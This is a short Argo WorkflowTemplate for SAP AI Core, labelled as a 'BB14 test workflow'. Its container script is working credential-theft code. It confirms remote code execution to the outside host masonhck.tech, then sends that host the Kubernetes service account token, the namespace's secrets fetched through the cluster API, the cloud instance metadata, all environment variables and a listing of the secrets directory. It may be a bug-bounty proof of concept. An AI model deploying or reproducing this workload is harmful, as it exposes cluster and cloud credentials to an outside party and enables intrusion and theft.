apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "1.0.2"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: curlimages/curl:latest
      command:
      - sh
      - -c
      - |
        curl -k -s "https://www.masonhck.tech/cb.php?src=rce-confirmed-$(hostname)"
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo none)
        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo none)
        curl -k -s "https://www.masonhck.tech/cb.php?src=ns-${NS}"
        curl -k -s "https://www.masonhck.tech/cb.php?src=token-${TOKEN:0:50}"
        curl -k -s "https://kubernetes.default.svc/api/v1/namespaces/${NS}/secrets" \
          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 2000 | \
          curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=k8s-secrets" -d @-
        curl -k -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" 2>&1 | \
          curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=imds" -d @-
        env | curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=env-dump" -d @-
        ls -la /var/run/secrets/ 2>&1 | curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=secrets-dir" -d @-
      resources:
        limits:
          cpu: "1"
          memory: "1Gi"
        requests:
          cpu: "100m"
          memory: "128Mi"
